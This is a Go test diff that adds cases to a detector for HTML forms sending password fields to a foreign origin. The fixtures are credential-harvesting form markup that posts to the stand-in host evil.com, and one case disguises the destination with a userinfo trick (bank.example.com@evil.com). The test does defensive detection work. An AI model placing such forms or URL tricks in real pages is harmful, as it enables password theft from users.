@@ -34,6 +34,9 @@ func TestFormOrigin(t *testing.T) {
 		{"대문자타입", `<form action="https://evil.com/x"><input TYPE=PASSWORD></form>`, 1},
 		{"유저정보속임", `<form action="https://bank.example.com@evil.com/x"><input type=password></form>`, 1},
 		{"폼밖의비밀번호", `<input type=password><form action="https://evil.com/x"></form>`, 0},
+		{"중첩form", `<form action="https://evil.com/x"><form action="/safe"><input type=password></form></form>`, 1},
+		{"div속깊이", `<form action="https://evil.com/x"><div><p><input type=password>`, 1},
+		{"표속", `<form action="https://evil.com/x"><table><tr><td><input type=password>`, 1},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
